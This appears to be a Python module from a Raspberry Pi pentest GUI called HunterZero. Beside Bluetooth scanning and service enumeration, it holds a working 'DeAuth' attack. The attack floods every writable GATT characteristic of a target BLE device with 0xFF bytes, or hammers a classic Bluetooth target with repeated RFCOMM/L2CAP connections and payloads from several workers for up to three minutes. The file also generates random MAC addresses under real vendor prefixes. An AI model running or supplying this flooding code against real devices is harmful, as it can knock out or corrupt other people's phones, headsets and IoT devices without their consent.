"""Bounded Bluetooth/BLE analysis and DeAuth jobs driven from the HunterZero GUI.

The original Bleeding tool had to be split into reusable pieces: module-level
optional imports let us run the same actions on the Pi and in offline tests,
while the job state is polled by the screen instead of blocking Pygame.
"""

import asyncio
import os
import platform
import random
import re
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field


try:
    import bleak
    from bleak import BleakClient, BleakScanner

    BLEAK_AVAILABLE = True
except ImportError:
    bleak = None
    BleakClient = None
    BleakScanner = None
    BLEAK_AVAILABLE = False

try:
    import bluetooth

    PYBLUEZ_AVAILABLE = True
except ImportError:
    bluetooth = None
    PYBLUEZ_AVAILABLE = False

MAC_PATTERN = re.compile(r"^(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
MAC_MIN = 0x00
MAC_MAX = 0xFF

SCAN_SECONDS = 5
MAX_PACKET_SIZE = 1024
MAX_ATTACK_SECONDS = 180
ATTACK_DURATIONS = (10, 30, 60, MAX_ATTACK_SECONDS)
PACKET_SIZES = (128, 256, 512, 1024)
THREAD_COUNTS = (1, 2, 4)

MODES = ("BLE", "BR/EDR")
PROTOCOLS = ("RFCOMM", "L2CAP")
PORT_BY_PROTOCOL = {"RFCOMM": 1, "L2CAP": 0x1001}
KIND_SCAN = "ESCANEO"
KIND_ENUM = "ENUMERACION"
KIND_DEAUTH = "DEAUTH"

VENDORS_OUI = {
    "acer": "C0:98:79",
    "apple": "FC:FC:48",
    "asus": "FC:C2:33",
    "dell": "D8:D0:90",
    "google": "F8:8F:CA",
    "hp": "B0:5C:DA",
    "htc": "98:0D:2E",
    "intel": "FC:F8:AE",
    "lenovo": "A4:8C:DB",
    "lg": "F8:A9:D0",
    "microsoft": "C4:9D:ED",
    "motorola": "F8:F1:B6",
    "samsung": "FC:F1:36",
    "sony": "D4:38:9C",
    "toshiba": "EC:21:E5",
    "xiaomi": "FC:64:BA",
}


class SocketBluetooth:
    """BR/EDR sockets from the standard library when PyBluez is not installed."""

    L2CAP = getattr(socket, "BTPROTO_L2CAP", 5)
    RFCOMM = getattr(socket, "BTPROTO_RFCOMM", 3)
    discovery_supported = False

    def discover_devices(self, **kwargs):
        """Explain that classic discovery still needs PyBluez or python3-bluez."""
        del kwargs
        raise RuntimeError("Falta pybluez para escanear BR/EDR")

    def find_service(self, address):
        """Explain that SDP enumeration still needs PyBluez or python3-bluez."""
        del address
        raise RuntimeError("Falta pybluez para enumerar BR/EDR")

    def BluetoothSocket(self, protocol):
        """Create a standard-library AF_BLUETOOTH socket for one protocol."""
        family = getattr(socket, "AF_BLUETOOTH", None)
        if family is None:
            raise RuntimeError("AF_BLUETOOTH no disponible en este sistema")
        return socket.socket(family, socket.SOCK_STREAM, protocol)


def normalize_target(value: str) -> str:
    """Validate a Bluetooth address and return it in canonical uppercase form."""
    target = str(value).strip().upper()
    if not MAC_PATTERN.fullmatch(target):
        raise ValueError("MAC invalida (XX:XX:XX:XX:XX:XX)")
    return target


def validate_deauth_parameters(
    address: str,
    mode: str,
    protocol: str,
    port: int,
    packet_size: int,
    workers: int,
    duration: int,
    *,
    is_windows: bool | None = None,
) -> str:
    """Validate every DeAuth option before starting any connection attempt."""
    target = normalize_target(address)
    if mode not in MODES:
        raise ValueError("Modo Bluetooth no valido")
    if mode == "BR/EDR":
        if protocol not in PROTOCOLS:
            raise ValueError("Protocolo no valido")
        windows = platform.system() == "Windows" if is_windows is None else is_windows
        if protocol == "L2CAP" and windows:
            raise ValueError("L2CAP no disponible en Windows")
    if not 1 <= port <= 65535:
        raise ValueError("Puerto fuera de rango")
    if not 1 <= packet_size <= MAX_PACKET_SIZE:
        raise ValueError("Tamano de paquete fuera de rango")
    if workers not in THREAD_COUNTS:
        raise ValueError("Numero de hilos no permitido")
    if not 1 <= duration <= MAX_ATTACK_SECONDS:
        raise ValueError("Duracion fuera de rango")
    return target


def random_mac_tail() -> str:
    """Generate the last three bytes of a Bluetooth address."""
    values = [random_hex_byte() for _ in range(3)]
    return ":".join(values)


def random_hex_byte() -> str:
    """Return one random byte formatted with two hexadecimal digits."""
    return format(random.randint(MAC_MIN, MAC_MAX), "02x")


def random_mac() -> str:
    """Build a random address using one of the known vendor prefixes."""
    return f"{random.choice(list(VENDORS_OUI.values()))}:{random_mac_tail()}"


def random_mac_all_vendors() -> list[tuple[str, str]]:
    """Build one random address per vendor for quick reference in the UI."""
    return [(vendor, f"{oui}:{random_mac_tail()}") for vendor, oui in VENDORS_OUI.items()]


@dataclass
class JobState:
    """Immutable-by-convention snapshot of the active background job."""

    kind: str = ""
    running: bool = False
    message: str = ""
    devices: list[dict] = field(default_factory=list)
    services: list[dict] = field(default_factory=list)
    events: list[str] = field(default_factory=list)
    started_at: float = 0.0


class BluetoothEngine:
    """Run Bluetooth jobs off the Pygame loop with explicit cancellation."""

    def __init__(self, bleak_module=None, bluetooth_module=None) -> None:
        """Store optional libraries so the engine also works without hardware."""
        self._bleak = bleak if bleak_module is None else bleak_module
        if bluetooth_module is not None:
            self._bluetooth = bluetooth_module
        else:
            self._bluetooth = bluetooth if bluetooth is not None else SocketBluetooth()
        self._state = JobState()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._local = threading.local()

    @property
    def _job_state(self) -> JobState:
        """Return the state owned by the calling worker, or the GUI's current job."""
        return getattr(self._local, "state", self._state)

    @property
    def _job_stop(self) -> threading.Event:
        """Return the cancellation event owned by the calling worker."""
        return getattr(self._local, "stop", self._stop)

    @property
    def ble_available(self) -> bool:
        """Report whether the Bleak BLE stack has been imported."""
        return self._bleak is not None

    @property
    def bredr_available(self) -> bool:
        """Report whether BR/EDR sockets are available with or without PyBluez."""
        return self._bluetooth is not None

    @property
    def bredr_discovery_available(self) -> bool:
        """Report whether classic discovery and SDP enumeration can run."""
        return (
            bool(getattr(self._bluetooth, "discovery_supported", True))
            and callable(getattr(self._bluetooth, "discover_devices", None))
            and callable(getattr(self._bluetooth, "find_service", None))
        )

    @property
    def is_running(self) -> bool:
        """Report whether a job currently owns the engine."""
        return self._state.running

    def snapshot(self) -> JobState:
        """Return a shallow copy of the job state for safe rendering."""
        return JobState(
            kind=self._state.kind,
            running=self._state.running,
            message=self._state.message,
            devices=[dict(device) for device in self._state.devices],
            services=[dict(service) for service in self._state.services],
            events=list(self._state.events),
            started_at=self._state.started_at,
        )

    def start_scan(self, mode: str) -> None:
        """Start a short BLE or BR/EDR discovery job."""
        self._require_mode(mode)
        self._start(KIND_SCAN, self._run_scan, mode)

    def start_enumeration(self, address: str, mode: str) -> None:
        """Start GATT or SDP service enumeration for one validated address."""
        self._require_mode(mode)
        target = normalize_target(address)
        self._start(KIND_ENUM, self._run_enumeration, target, mode)

    def start_deauth(
        self,
        address: str,
        mode: str,
        protocol: str,
        port: int,
        packet_size: int,
        workers: int,
        duration: int,
    ) -> None:
        """Start a bounded DeAuth job after validating all of its parameters."""
        target = validate_deauth_parameters(
            address, mode, protocol, port, packet_size, workers, duration
        )
        self._require_mode(mode, needs_discovery=False)
        self._start(
            KIND_DEAUTH, self._run_deauth, target, mode, protocol, port, packet_size, workers, duration
        )

    def cancel(self) -> None:
        """Ask the active job to stop at its next safe checkpoint."""
        state = self._state
        if not state.running:
            return
        self._stop.set()
        if self._thread is not None and self._thread.is_alive():
            self._thread.join(timeout=0.2)
        state.running = False
        state.message = "Cancelado"

    def _require_mode(self, mode: str, *, needs_discovery: bool = True) -> None:
        """Reject unsupported modes and libraries that are not installed."""
        if mode not in MODES:
            raise ValueError("Modo Bluetooth no valido")
        if mode == "BLE" and not self.ble_available:
            raise RuntimeError("Falta bleak: instala el paquete en el entorno virtual")
        if mode == "BR/EDR" and not self.bredr_available:
            raise RuntimeError("Falta soporte BR/EDR (AF_BLUETOOTH) en este sistema")
        if mode == "BR/EDR" and needs_discovery and not self.bredr_discovery_available:
            raise RuntimeError("Falta pybluez o python3-bluez para escanear/enumerar BR/EDR")

    def _start(self, kind: str, runner, *arguments) -> None:
        """Launch one daemon worker and reset the previous job state."""
        if self.is_running:
            raise RuntimeError("Ya hay una tarea Bluetooth en curso")
        if hasattr(os, "geteuid") and os.geteuid() == 0:
            raise RuntimeError("No ejecutes HunterZero como root")
        stop = threading.Event()
        state = JobState(
            kind=kind, running=True, message=f"{kind} en curso", started_at=time.monotonic()
        )
        self._stop = stop
        self._state = state
        self._thread = threading.Thread(
            target=self._worker,
            args=(state, stop, runner, arguments),
            name=f"hunterzero-{kind.lower()}",
            daemon=True,
        )
        self._thread.start()

    def _worker(self, state: JobState, stop: threading.Event, runner, arguments) -> None:
        """Run one job against its own state so an older thread cannot corrupt a new one."""
        self._local.state = state
        self._local.stop = stop
        try:
            runner(*arguments)
        except Exception as error:
            state.message = f"Fallo: {error}"
        finally:
            state.running = False
            if not stop.is_set() and state.message == f"{state.kind} en curso":
                state.message = f"{state.kind}: finalizado"

    def _append_event(self, text: str) -> None:
        """Keep a short, bounded tail of worker events for the screen."""
        state = self._job_state
        state.events.append(text[:34])
        if len(state.events) > 8:
            state.events.pop(0)

    def _run_scan(self, mode: str) -> None:
        """Store discovered devices after a BLE or BR/EDR scan."""
        devices = self._scan_ble() if mode == "BLE" else self._scan_bredr()
        state = self._job_state
        state.devices = devices
        state.message = f"{len(devices)} dispositivos"

    def _run_enumeration(self, target: str, mode: str) -> None:
        """Store the services found on a selected device."""
        services = self._enumerate_ble(target) if mode == "BLE" else self._enumerate_bredr(target)
        state = self._job_state
        state.services = services
        state.message = f"{len(services)} servicios"

    def _run_deauth(
        self,
        target: str,
        mode: str,
        protocol: str,
        port: int,
        packet_size: int,
        workers: int,
        duration: int,
    ) -> None:
        """Dispatch the attack to the BLE or BR/EDR implementation."""
        if mode == "BLE":
            self._deauth_ble(target, packet_size, workers, duration)
        else:
            self._deauth_bredr(target, protocol, port, packet_size, workers, duration)
        state = self._job_state
        if self._job_stop.is_set():
            state.message = "Ataque cancelado"
        else:
            state.message = f"{state.kind}: {duration}s completados"

    def _scan_ble(self) -> list[dict]:
        """Discover nearby BLE devices using the available Bleak stack."""

        async def discover() -> list[dict]:
            """Collect advertisement data with the library's asyncio API."""
            result = await self._bleak.BleakScanner.discover(timeout=SCAN_SECONDS, return_adv=True)
            pairs = result.items() if isinstance(result, dict) else [(item[0], item[1]) for item in result]
            devices = []
            for device, advertisement in pairs:
                if self._job_stop.is_set():
                    break
                address = getattr(device, "address", "") or ""
                if not MAC_PATTERN.fullmatch(address):
                    continue
                devices.append(
                    {
                        "address": address.upper(),
                        "name": getattr(device, "name", None) or "DESCONOCIDO",
                        "type": "BLE",
                        "rssi": getattr(advertisement, "rssi", None),
                        "class": None,
                    }
                )
            return devices

        return asyncio.run(discover())

    def _scan_bredr(self) -> list[dict]:
        """Discover classic Bluetooth devices with PyBluez."""
        found = self._bluetooth.discover_devices(
            lookup_names=True, duration=SCAN_SECONDS, flush_cache=True, lookup_class=True
        )
        devices = []
        for address, name, device_class in found:
            if self._job_stop.is_set():
                break
            devices.append(
                {
                    "address": str(address).upper(),
                    "name": name or "DESCONOCIDO",
                    "type": "BR/EDR",
                    "rssi": None,
                    "class": device_class,
                }
            )
        return devices

    def _enumerate_ble(self, target: str) -> list[dict]:
        """Read GATT services and writable characteristics from a BLE device."""

        async def enumerate_services() -> list[dict]:
            """Connect once and walk the GATT hierarchy with bounded timeouts."""
            services = []
            async with self._bleak.BleakClient(target, timeout=10.0) as client:
                for service in client.services:
                    if self._job_stop.is_set():
                        break
                    characteristics = [
                        {
                            "uuid": char.uuid,
                            "description": getattr(char, "description", "") or "DESCONOCIDO",
                            "properties": list(getattr(char, "properties", [])),
                        }
                        for char in service.characteristics
                    ]
                    services.append(
                        {
                            "name": getattr(service, "description", "") or "DESCONOCIDO",
                            "description": f"UUID: {service.uuid}",
                            "protocol": "GATT",
                            "port": 0,
                            "uuid": service.uuid,
                            "characteristics": characteristics,
                        }
                    )
            return services

        return asyncio.run(enumerate_services())

    def _enumerate_bredr(self, target: str) -> list[dict]:
        """Read SDP services advertised by a classic Bluetooth device."""
        found = self._bluetooth.find_service(address=target)
        services = []
        for service in found:
            if self._job_stop.is_set():
                break
            name = service.get("name") or "DESCONOCIDO"
            if isinstance(name, bytes):
                name = name.decode("utf-8", errors="ignore")
            services.append(
                {
                    "name": name,
                    "description": str(service.get("description", "N/A")),
                    "protocol": str(service.get("protocol", "Desconocido")),
                    "port": int(service.get("port", 0) or 0),
                    "uuid": str(service.get("service-id", "N/A")),
                    "characteristics": [],
                }
            )
        return services

    def _deauth_ble(self, target: str, packet_size: int, workers: int, duration: int) -> None:
        """Flood writable GATT characteristics until cancelled or timed out."""

        async def attack() -> None:
            """Resolve the device once, then run cooperative writers on one event loop."""
            deadline = time.monotonic() + duration
            device = target
            finder = getattr(self._bleak.BleakScanner, "find_device_by_address", None)
            if finder is not None:
                try:
                    found = await finder(target, timeout=5.0)
                except TypeError:
                    try:
                        found = await finder(target)
                    except Exception:
                        found = None
                except Exception:
                    found = None
                if found is not None:
                    device = found

            async def worker(worker_id: int) -> None:
                """Write bounded payloads to any writable characteristic, retrying failures."""
                while not self._job_stop.is_set() and time.monotonic() < deadline:
                    try:
                        async with self._bleak.BleakClient(device, timeout=10.0) as client:
                            mtu = getattr(client, "mtu_size", None)
                            request_limit = min(512, max(1, int(mtu) - 3)) if mtu else 512
                            writable = []
                            for service in client.services:
                                for char in service.characteristics:
                                    properties = {str(prop).lower() for prop in char.properties}
                                    if not properties & {"write", "write-without-response"}:
                                        continue
                                    without_response = "write-without-response" in properties
                                    limit = getattr(char, "max_write_without_response_size", None)
                                    maximum = int(limit) if limit else 20
                                    size = (
                                        min(packet_size, maximum)
                                        if without_response
                                        else min(packet_size, request_limit)
                                    )
                                    writable.append((char.uuid, not without_response, size))
                            if not writable:
                                self._append_event(f"H{worker_id}: sin escritura")
                                return
                            for uuid, response, size in writable:
                                if self._job_stop.is_set():
                                    return
                                payload = b"\xff" * size
                                await client.write_gatt_char(uuid, payload, response=response)
                                self._append_event(f"H{worker_id} {uuid[-4:]} {size}B")
                    except Exception as error:
                        self._append_event(f"H{worker_id}: {str(error)[:20]}")
                        await asyncio.sleep(0.25)
                        continue
                    await asyncio.sleep(0.25)

            await asyncio.gather(*(worker(index + 1) for index in range(workers)))

        asyncio.run(attack())

    def _deauth_bredr(
        self,
        target: str,
        protocol: str,
        port: int,
        packet_size: int,
        workers: int,
        duration: int,
    ) -> None:
        """Send bounded L2CAP/RFCOMM payloads from a small thread pool."""
        protocol_value = self._bluetooth.L2CAP if protocol == "L2CAP" else self._bluetooth.RFCOMM
        deadline = time.monotonic() + duration
        payload = b"\x01" * packet_size
        state = self._job_state
        stop = self._job_stop

        def worker(worker_id: int) -> None:
            """Open one socket at a time and report each failed connection."""
            self._local.state = state
            self._local.stop = stop
            while not self._job_stop.is_set() and time.monotonic() < deadline:
                sock = None
                try:
                    sock = self._bluetooth.BluetoothSocket(protocol_value)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    sock.send(payload)
                    self._append_event(f"H{worker_id}: {len(payload)}B enviados")
                except Exception as error:
                    self._append_event(f"H{worker_id}: {str(error)[:20]}")
                    time.sleep(0.25)
                    continue
                finally:
                    if sock is not None:
                        sock.close()
                time.sleep(0.25)

        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = [pool.submit(worker, index + 1) for index in range(workers)]
            for future in futures:
                future.result()
